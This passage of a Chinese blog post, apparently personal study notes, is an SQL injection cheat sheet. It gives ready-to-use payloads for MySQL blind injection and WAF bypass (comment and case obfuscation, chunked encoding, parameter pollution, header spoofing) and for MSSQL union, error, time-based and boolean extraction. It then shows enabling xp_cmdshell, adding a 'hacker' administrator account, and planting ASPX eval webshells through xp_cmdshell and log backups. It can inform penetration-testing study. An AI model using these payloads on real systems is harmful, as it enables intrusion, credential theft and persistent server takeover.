<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用, 那么就可以使用 greatest 来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数 (n1,n2,n3,…) 的最大值。 那么上面的这条 sql 语句可以使用 greatest 变为如下的子句:</p>
<p>select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</p>
<h3 id="Between-注入-1"><a href="#Between-注入-1" class="headerlink" title="Between 注入"></a>Between 注入</h3><p>主要用于盲注看页面是否有变化，原理如下，例如 username 的字符内容是 test1，第一个字符是 t，a 到 b 搜索不了，页面不正常。 a 到 t 就有了，页面正常</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765644_62cf7f0c4a9bf9f4e426d.png!small"></p>
<p>使用 between and：</p>
<p>使用 between and:</p>
<p>between a and b：</p>
<p>between 1 and 1; 等价于 &#x3D;1</p>
<h3 id="or-and-xor-not-绕过："><a href="#or-and-xor-not-绕过：" class="headerlink" title="or and xor not 绕过："></a>or and xor not 绕过：</h3><p>and&#x3D;&amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!</p>
<h3 id="绕过注释符"><a href="#绕过注释符" class="headerlink" title="绕过注释符"></a>绕过注释符</h3><p>（#，–(后面跟一个空格））过滤：</p>
<p>id&#x3D;1’union select 1,2,3||’1</p>
<p>最后的 or ‘1 闭合查询语句的最后的单引号，或者：</p>
<p>id&#x3D;1’union select 1,2,’3</p>
<h3 id="绕过等于号"><a href="#绕过等于号" class="headerlink" title="绕过等于号"></a>绕过等于号</h3><p>使用 like 、rlike 、regexp 或者 使用 &lt;或者&gt;</p>
<h3 id="绕过-union，select，where-等："><a href="#绕过-union，select，where-等：" class="headerlink" title="绕过 union，select，where 等："></a>绕过 union，select，where 等：</h3><p>（1）使用注释符绕过：</p>
<p>常用注释符：&#x2F;&#x2F;，– , &#x2F;**&#x2F;, #, –+, – -, ;,%00,–a</p>
<p>用法：U&#x2F;<strong>&#x2F; NION &#x2F;</strong>&#x2F; SE&#x2F;<strong>&#x2F; LECT &#x2F;</strong>&#x2F;user，pwd from user</p>
<p>（2）使用大小写绕过：</p>
<p>id&#x3D;-1’UnIoN&#x2F;**&#x2F;SeLeCT</p>
<p>（3）内联注释绕过：</p>
<p>id&#x3D;-1’&#x2F;<em>!UnIoN</em>&#x2F; SeLeCT 1,2,concat(&#x2F;<em>!table_name</em>&#x2F;) FrOM &#x2F;<em>information_schema</em>&#x2F;.tables &#x2F;<em>!WHERE <em>&#x2F;&#x2F;</em>!TaBlE_ScHeMa</em>&#x2F; like database()#</p>
<p>（4） 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）：</p>
<p>id&#x3D;-1’UNIunionONSeLselectECT1,2,3–-</p>
<h3 id="WAF-绕过-应用层"><a href="#WAF-绕过-应用层" class="headerlink" title="WAF 绕过 - 应用层"></a>WAF 绕过 - 应用层</h3><p>Sql 绕过姿势：<a target="_blank" rel="noopener" href="https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html">https://www.csdn.net/tags/MtTaEgwsMTU4NzM1LWJsb2cO0O0O.html</a></p>
<h4 id="大小写-x2F-关键字替换"><a href="#大小写-x2F-关键字替换" class="headerlink" title="大小写 &#x2F; 关键字替换"></a>大小写 &#x2F; 关键字替换</h4><ul>
<li><p>id&#x3D;1UnIoN&#x2F;**&#x2F;SeLeCT1,user()</p>
</li>
<li><p>Hex() bin() 等价于 ascii()</p>
</li>
<li><p>Sleep() 等价于 benchmark()</p>
</li>
<li><p>Mid() substring() 等价于 substr()</p>
</li>
<li><p>@@user 等价于 User()</p>
</li>
<li><p>@@Version 等价于 version()</p>
</li>
</ul>
<p>绕过：</p>
<p>AND -&gt; &amp;&amp;</p>
<p>OR -&gt; || &#x2F; ^</p>
<p>= -&gt; LIKE,REGEXP, BETWEEN, not <and not>，!&lt;&gt;</p>
<p>&gt; X -&gt; not between 0 and X</p>
<p>WHERE -&gt; HAVING</p>
<p>手工盲注 1’||ascii(substr(database(),2,1))&gt;&#x3D;’120</p>
<h4 id="各种编码"><a href="#各种编码" class="headerlink" title="各种编码"></a>各种编码</h4><p>大小写，URL，hex，%0A 等</p>
<h4 id="注释使用"><a href="#注释使用" class="headerlink" title="注释使用"></a>注释使用</h4><p>&#x2F;&#x2F;—-+#&#x2F;&#x2F;+:%00&#x2F;!&#x2F; 等</p>
<h4 id="再次循环"><a href="#再次循环" class="headerlink" title="再次循环"></a>再次循环</h4><p>union&#x3D;&#x3D;uunionnion</p>
<h4 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h4><p>比如在 burp 抓包时，存在 Post 请求的注入，如 id&#x3D;1’ and 1&#x3D;2#</p>
<p>尝试分块传输</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765719_62cf7f578b907ecc13fdc.png!small"></p>
<p>进行分块传输的时候，请求头要加上 <strong>Transfer-Encoding: Chunked</strong>，然后 POST 的数据规则如下</p>
<p>2 #下面的数据的长度，可以在后面加个分号然后添加注释（2; hello world） id #请求的参数 2 #下面的数据的长度 &#x3D;1 #请求的值，和前面的 id 连起来 0 #表明分块请求结束，一个 0 和两个换行</p>
<p>最后就是大佬写出的插件，安装了一键分块 Orz<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p>
<h4 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h4><p>hex()、bin() &#x3D;&#x3D;&gt; ascii()<br>sleep() &#x3D;&#x3D;&gt;benchmark()<br>concat_ws()&#x3D;&#x3D;&gt;group_concat()<br>mid()、substr() &#x3D;&#x3D;&gt; substring()<br>@@user &#x3D;&#x3D;&gt; user()<br>@@datadir &#x3D;&#x3D;&gt; datadir()<br>举例：substring() 和 substr() 无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74　<br>或者：<br>substr((select ‘password’),1,1) &#x3D; 0x70<br>strcmp(left(‘password’,1), 0x69) &#x3D; 1<br>strcmp(left(‘password’,1), 0x70) &#x3D; 0<br>strcmp(left(‘password’,1), 0x71) &#x3D; -1</p>
<h4 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h4><p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p>
<h4 id="编码解码及加密解密"><a href="#编码解码及加密解密" class="headerlink" title="编码解码及加密解密"></a>编码解码及加密解密</h4><ul>
<li><p>s-&gt;%73-&gt;%25%37%33</p>
</li>
<li><p>hex,unlcode,base64 等</p>
</li>
</ul>
<h4 id="更改请求提交方式"><a href="#更改请求提交方式" class="headerlink" title="更改请求提交方式"></a>更改请求提交方式</h4><p>尝试更改 Get 请求为 Post 请求</p>
<ul>
<li><p>GET POST COOKIE 等</p>
</li>
<li><p>POST-&gt;multipart&#x2F;form-data</p>
</li>
</ul>
<h4 id="中间件-HPP-HTTP-参数污染"><a href="#中间件-HPP-HTTP-参数污染" class="headerlink" title="中间件 HPP(HTTP 参数污染)"></a>中间件 HPP(HTTP 参数污染)</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765734_62cf7f6657d4c137788e0.png!small"></p>
<p><strong>HPP</strong> 是 HTTP Parameter Pollution 的缩写，意为 HTTP 参数污染。</p>
<ul>
<li><p>原理：浏览器在跟服务器进行交互的过程中，浏览器往往会在 GET&#x2F;POST 请求里面带上参数，这些参数会以 名称 - 值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。但是在 HTTP 协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a target="_blank" rel="noopener" href="http://www.baidu.com/?name=aa&name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF">http://www.baidu.com?name=aa&amp;name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是</a> name&#x3D;aa。有的服务器是取第二个参数，也就是 name&#x3D;bb。有的服务器两个参数都取，也就是 name&#x3D;aa,bb 。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p>
</li>
<li><p>HPP 漏洞，与 Web 服务器环境、服务端使用的脚本有关。如下是不同 Web 服务器对于出现多个参数时的选择</p>
</li>
<li><p>通过 HPP 接管账户, 当网站开发者不熟悉 Web 服务器对于多参数时如何选择，将给攻击者可乘之机。HPP 能针对客户端和服务端进行攻击。</p>
</li>
<li><p>HPP 参数污染还可以用于绕过某些防火墙对于 SQL 注入的检测，例如当 Web 服务器对多参数都同时选择时，我们可以用以下这种方式绕过某些防火墙：</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1,2,3 from table where id&#x3D;1<br><a target="_blank" rel="noopener" href="http://www.test.com/index.asp?page=select">http://www.test.com/index.asp?page=select</a> 1&amp;page&#x3D;2,3 from table where id&#x3D;1</p>
<p>HTTP 参数污染是指当同一参数出现多次，不同的中间件会解析为不同的结果, 以参数 color&#x3D;red&amp;color&#x3D;blue 为例</p>
<h3 id="WAF-绕过-数据库特性"><a href="#WAF-绕过-数据库特性" class="headerlink" title="WAF 绕过 - 数据库特性"></a>WAF 绕过 - 数据库特性</h3><p>mysql 注释符有三种</p>
<ul>
<li>#,&#x2F;…&#x2F;,–…(注意 – 后面有一个空格，或者为 –+)</li>
</ul>
<p>空格符</p>
<ul>
<li>0x09,0x0a-0x0d,0x20,0xa0</li>
</ul>
<p>特殊符号：%a 换行符</p>
<ul>
<li>可结合注释符使用 %23%0a,%2d%2d%0a</li>
</ul>
<p>内联注释</p>
<ul>
<li>&#x2F;!UnIon12345SelEcT&#x2F;1,user(), 数字范围 1000-50540</li>
</ul>
<p>mysql 黑魔法</p>
<ul>
<li>select{xusername}from{x11test.admin};</li>
</ul>
<h3 id="WAF-绕过-逻辑层"><a href="#WAF-绕过-逻辑层" class="headerlink" title="WAF 绕过 - 逻辑层"></a>WAF 绕过 - 逻辑层</h3><p>逻辑问题</p>
<ol>
<li><p>云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。</p>
</li>
<li><p>当提交 GET、POST 同时请求时，进入 POST 逻辑，而忽略了 GET 请求的有害参数输入, 可尝试 Bypass。</p>
</li>
<li><p>HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致 HTTPS 有 WAF 防护，HTTP 没有防护，直接访问 HTTP 站点绕过防护。</p>
</li>
<li><p>特殊符号 %00，部分 waf 遇到 %00 截断，只能获取到前面的参数，无法获取到后面的有害参数输入，从而导致 Bypass。比如：id&#x3D;1 %00 and 1&#x3D;2 union select 1,2,column_name from information_schema.columns</p>
</li>
</ol>
<p>性能问题</p>
<ul>
<li><p>猜想 1：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p>
</li>
<li><p>猜想 2：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向量时超出了其缓冲区长度就会引发 bug，从而实现绕过。</p>
</li>
</ul>
<p>例子 1：</p>
<p>?id&#x3D;1and(select1)&#x3D;(Select0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9</p>
<ul>
<li>0xA*1000 指 0xA 后面 A 重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。</li>
</ul>
<p>例子 2：</p>
<p>?a0&#x3D;0&amp;a1&#x3D;1&amp;…..&amp;a100&#x3D;100&amp;id&#x3D;1<br>union<br>select<br>1,schema_name,3<br>from<br>INFORMATION_SCHEMA.schemata</p>
<ul>
<li>获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。</li>
</ul>
<p>白名单</p>
<ul>
<li><p>方式一：IP 白名单</p>
</li>
<li><p>从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情况。测试方法：修改 http 的 header 来 bypasswaf</p>
</li>
</ul>
<p>X-forwarded-for<br>X-remote-IP<br>X-originating-IP<br>x-remote-addr<br>X-Real-ip</p>
<p>方式二：静态资源</p>
<ul>
<li><p>特定的静态资源后缀请求，常见的静态文件 (.js.jpg.swf.css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
</li>
<li><p>Aspx&#x2F;php 只识别到前面的. aspx&#x2F;.php 后面基本不识别</p>
</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php?id=1">http://10.9.9.201/sql.php?id=1</a><br><a target="_blank" rel="noopener" href="http://10.9.9.201/sql.php/1.js?id=1">http://10.9.9.201/sql.php/1.js?id=1</a></p>
<p>方式三：url 白名单</p>
<ul>
<li>为了防止误拦，部分 waf 内置默认的白名单列表，如 admin&#x2F;manager&#x2F;system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。常见的 url 构造姿势</li>
</ul>
<p>学习文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q">https://mp.weixin.qq.com/s/gjEPi8DKVsfGyEv8fnzY3Q</a></p>
<p><strong>SQL Server</strong> 数据库是由 Microsoft 开发和推广的关系数据库管理系统 (DBMS)，是一个比较大型的数据库。端口号为 <strong>1433</strong>。数据库后缀名 .mdf，注释符是 – 。延时命令：WAITFOR DELAY ‘0:0:2’</p>
<p><strong>SQLServer 有三个权限级别：</strong></p>
<ul>
<li><p>sa 权限：数据库操作，文件管理，命令执行，注册表读取等 system。SQLServer 数据库的最高权限</p>
</li>
<li><p>db 权限：文件管理，数据库操作等权限 users-administrators</p>
</li>
<li><p>public 权限：数据库操作 guest-users</p>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765752_62cf7f787d9033b77f774.png!small"></p>
<p>判断是否是 SA 权限 (数据库操作、文件管理、命令执行、注册表读取)</p>
<ol>
<li>select is_srvrolemember(‘sysadmin’)</li>
</ol>
<p>判断是否是 db_owner 权限 (数据库操作、文件管理)</p>
<ol>
<li>select is_member(‘db_owner’)</li>
</ol>
<p>判断是否是 public 权限 (数据库操作)</p>
<ol>
<li>select is_srvrolemember(‘public’)</li>
</ol>
<p>SQLServer 数据库有 6 个默认的库，分别是 4 个系统数据库：master 、model 、msdb 、tempdb，和 2 个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。</p>
<p>附上 payload：</p>
<p>select @@version; #查询数据库的版本</p>
<p>select @@servername; #查询服务名</p>
<p>select host_name(); #查询主机名，如果是用 navicat 远程连接的话，主机名是本地的名字</p>
<p>select db_name(); #查询当前数据库名</p>
<p>select db_name(1); #查询第一个数据库名</p>
<p>select db_name(2); #查询第二个数据库名</p>
<p>select user; #查询当前数据库的拥有者，结果为 dbo。dbo 是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即 DbOwner</p>
<p>use tempdb #切换到 tempdb 表</p>
<p>top n #查询前 n 条记录</p>
<p>limit 2,3 #查询第 2 条开始的 3 条数据，也就是 2,3,4</p>
<p>select substring(‘string’,2,1) #截取给定字符串的索引为 2 的 1 个字符</p>
<p>select ascii(‘a’) #查询给定字符串的 ascii 值</p>
<p>select len(‘string’) #查询给定字符串的长度</p>
<p>EXEC sp_spaceused @updateusage &#x3D; N’TRUE’; #查询当前数据库的大小</p>
<p>sp_spaceused ‘表名’ #查询指定表名的大小</p>
<p>EXEC master.sys.xp_dirtree ‘\192.168.106.5\xx.txt’,0,1;</p>
<p>判断是否是 SA 权限</p>
<p>select is_srvrolemember(‘sysadmin’)</p>
<p>判断是否是 db_owner 权限</p>
<p>select is_member(‘db_owner’)</p>
<p>判断是否是 public 权限</p>
<p>select is_srvrolemember(‘public’)</p>
<h3 id="普通注入-1"><a href="#普通注入-1" class="headerlink" title="普通注入"></a>普通注入</h3><p>order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4 之间。查找回显点</p>
<p>id&#x3D;2 and 1&#x3D;2 union all select null,null,null,null；挨个替换 null 发现 select null,2,null,null 页面出现回显。</p>
<p>查找所在库名称添加： ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select db_name()), ‘3’, 4</p>
<p>找到数据库名称。 提示：这里也可以使用 db_name(1)、db_name(2) 等查询其他数据</p>
<p>查找数据库表名称：?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype &#x3D; ‘U’),’3’,4 提示: xtype&#x3D;’U’ 为 用户表</p>
<p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 col_name(object_id(‘manage’),1) from sysobjects),’3’,4 替换 col_name(object_id(‘manage’),1) 中的 1 依次为 2，3，4 查出所有列名。</p>
<p>查取数据: ?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 username from manage),’3’,4 获取用户名；</p>
<p>?id&#x3D;2 and 1&#x3D;2 union all select 1,(select top 1 password from manage),’3’,4 获取密码</p>
<h2 id="全回显操作"><a href="#全回显操作" class="headerlink" title="全回显操作"></a>全回显操作</h2><p>获取当前数据库中的表（有 2 个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于 mssql2005 及以上版本）】</p>
<p>(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>案例： mozhe_dbv2 是数据库名字</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765776_62cf7f9087fb6626ca007.png!small"></p>
<p>一次爆指定表的所有列（只限于 mssql2005 及以上版本）：</p>
<p>(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–</p>
<p>(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p>
<p>案例： mange 是表名  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657765789_62cf7f9d50b3e1805fb70.png!small"></p>
<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>and 1&#x3D;(select @@VERSION) &#x2F;&#x2F;<strong>MSSQL</strong> 版本</p>
<p>And 1&#x3D;(select db_name()) &#x2F;&#x2F; 当前数据库名</p>
<p>and 1&#x3D;(select @@servername) &#x2F;&#x2F; 本地服务名</p>
<p>and 1&#x3D;(select IS_SRVROLEMEMBER(‘sysadmin’)) &#x2F;&#x2F; 判断是否是系统管理员 sa</p>
<p>常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin</p>
<p>and 1&#x3D;(Select IS_MEMBER(‘db_owner’)) &#x2F;&#x2F; 判断是否是库权限 dbo</p>
<p>and 1&#x3D; (Select HAS_DBACCESS(‘master’)) &#x2F;&#x2F; 判断是否有库读取权限</p>
<h3 id="2-单个爆破："><a href="#2-单个爆破：" class="headerlink" title="(2) 单个爆破："></a>(2) 单个爆破：</h3><p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables))—获取第一个表名</p>
<p>and 1&#x3D;convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘photoGalary’) )) 获取第二个表名</p>
<p>and 1&#x3D;convert(int,(select top 1 column_name from information_schema.columns where table_name&#x3D;’login’))— 获取第一个列名</p>
<p>and 1&#x3D;convert(int,(select top 1 username from login))</p>
<p>and 1&#x3D;convert(int,(select top 1 password from login))</p>
<h3 id="2-全爆语句"><a href="#2-全爆语句" class="headerlink" title="(2) 全爆语句"></a>(2) 全爆语句</h3><p> 爆表，要求 sqlserver 版本 2005 以上</p>
<p>and 1&#x3D;(select quotename(name) from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype&#x3D;’U’ FOR XML PATH(‘’))–</p>
<p>爆列</p>
<p>and 1&#x3D;(select quotename(name) from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))–<br>and 1&#x3D;(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id &#x3D;(select id from 数据库名..sysobjects where name&#x3D;’指定表名’) FOR XML PATH(‘’))—</p>
<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>aspx?id&#x3D;1;if (select IS_SRVROLEMEMBER(‘sysadmin’))&#x3D;1 WAITFOR DELAY ‘0:0:5’ –</p>
<p>如果是 sa 权限，就延时。</p>
<p>案例：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.3001.net/images/20220714/1657766248_62cf8168dbaad26776ceb.png!small"></p>
<p>判断内容</p>
<p>aspx?id&#x3D;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)))&gt;1 WAITFOR DELAY ‘0:0:5’–</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>1.aspx?id&#x3D;1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) &gt;&#x3D; 109</p>
<h3 id="XP-CMDSHELL-检测"><a href="#XP-CMDSHELL-检测" class="headerlink" title="XP_CMDSHELL 检测"></a>XP_CMDSHELL 检测</h3><p>看下目标的 xp_cmdshell 存储过程是否还在, 主要是想看它有没有被删掉, 你也可以用这种方式来查询其它你想知道的任何存储过程，如果判断还在，页面显示正常，不在的话页面报错。</p>
<p>and 1&#x3D;(select count(*) from master..sysobjects where xtype &#x3D; ‘x’ and name &#x3D; ‘xp_cmdshell’) –</p>
<p>开启 xpcmdshell 一句话。前提 1、支持堆叠 2、扩展存储过程没被删除</p>
<p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
<p>前提：sa 权限探测是否存在 1433 端口。然后检测是否开启 CMDSHELL</p>
<p>用 XP_CMDSHELL 添加用户 hacker：</p>
<p>exec master..xp_cmdshell “whoami”</p>
<p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net user hacker 123456 &#x2F;add’</p>
<p>XP_CMDSHELL 把用户 hacker 加到 ADMIN 组：</p>
<p>asp?id&#x3D;3;exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker &#x2F;add’</p>
<p>学习的文档：<a target="_blank" rel="noopener" href="https://www.lagou.com/lgeduarticle/38721.html">https://www.lagou.com/lgeduarticle/38721.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html">https://www.cnblogs.com/cnjava/archive/2012/06/13/2547524.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin/_34319999/article/details/92479895">https://blog.csdn.net/weixin\_34319999/article/details/92479895</a></p>
<h2 id="拿-shell-方法"><a href="#拿-shell-方法" class="headerlink" title="拿 shell 方法"></a>拿 shell 方法</h2><p>前提：</p>
<p>1 具备 sa 或者 dbo 权限</p>
<p>2web 目录的绝对路径 （可以利用 xp_cmdshell 的方式寻找绝对路径，插个眼）</p>
<h3 id="1-xp-cmdshell-拿-shell"><a href="#1-xp-cmdshell-拿-shell" class="headerlink" title="(1)xp_cmdshell 拿 shell"></a>(1)xp_cmdshell 拿 shell</h3><p>1.aspx?id&#x3D;1;exec master..xp_cmdshell ‘echo ^&lt;%@ Page Language&#x3D;”Jscript”%^&gt;^&lt;%eval(Request.Item[“pass”],”unsafe”);%^&gt; &gt; c:\WWW\aufeng.aspx’ ;</p>
<h3 id="2-差异备份拿-shell"><a href="#2-差异备份拿-shell" class="headerlink" title="(2) 差异备份拿 shell"></a>(2) 差异备份拿 shell</h3><p>大概思路：</p>
<p>假设：<a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1">http://xxxxx/show.aspx?code=1</a></p>
<p>中的 code 参数存在注入点 并且获得数据库名字为 abc 爆出了物理路径为 e:\xampp\htdocs\dvwa\</p>
<p>(1) 修改数据库设置为恢复模式</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.asp?code=1%27;alter">http://xxxxx/show.asp?code=1&#39;;alter</a> database abc set RECOVERY FULL –</p>
<p>完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。</p>
<p>(2) 备份当前数据库日志到文件</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1%27;backup">http://xxxxx/show.aspx?code=1&#39;;backup</a> log abc to disk&#x3D;‘e:\xampp\htdocs\dvwa’ with init –</p>
<p>备份数据库日志到服务器上，其中路径是网页的物理路径。</p>
<p>(3) 建立一张表和一个字段</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1%27;create">http://xxxxx/show.aspx?code=1&#39;;create</a> table tt(a text) –</p>
<p>(4) 往表中插入一句话马子</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.asp?code=1%27;insert">http://xxxxx/show.asp?code=1&#39;;insert</a> into tt(a) values(’&lt;%eval request(“abc”) %&gt;’) –</p>
<p>values 中的内容一般转换为马子的 hex 值。</p>
<p>(5) 再次备份日志</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.asp?code=1%27;backup">http://xxxxx/show.asp?code=1&#39;;backup</a> log ahykd_new to disk&#x3D;‘e:\xampp\htdocs\dvwa\1.aspx’ –</p>
<p>再次备份日志，备份路径为网站服务器的物理路径</p>
<p>(6) 删除表</p>
<p><a target="_blank" rel="noopener" href="http://xxxxx/show.aspx?code=1%27;drop">http://xxxxx/show.aspx?code=1&#39;;drop</a> table tt –</p>
<p>然后菜刀尝试连接 <a target="_blank" rel="noopener" href="http://xxxxx/1.aspx">http://xxxxx/1.aspx</a></p>
<p>参考文章：这里是借鉴大佬的笔记的总结</p>
<p><a target="_blank" rel="noopener" href="https://www.yuque.com/aufeng/aufeng/_good/iganif#Q5PqT">https://www.yuque.com/aufeng/aufeng\_good/iganif#Q5PqT</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vigarbuaa/p/3371500.html">https://www.cnblogs.com/vigarbuaa/p/3371500.html</a></p>
<p>Access 数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列</p>
<p>Access 数据库中没有注释符号. 因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。</p>
<p>sqlmap 语句：python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://test.com/1.asp?id=1">http://test.com/1.asp?id=1</a>“ –tables</p>
<h3 id="普通注入-2"><a href="#普通注入-2" class="headerlink" title="普通注入"></a>普通注入</h3><p>判断注入点</p>
<p>在参数后面加 单引号</p>
<p><a target="_blank" rel="noopener" href="http://www.example.com/new/_list.asp?id=1">http://www.example.com/new\_list.asp?id=1</a>‘ #页面报错</p>
<p><a target="_blank" rel="noopener" href="http://www.example.com/new/_list.asp?id=1">http://www.example.com/new\_list.asp?id=1</a> and 1&#x3D;1 #页面正常</p>
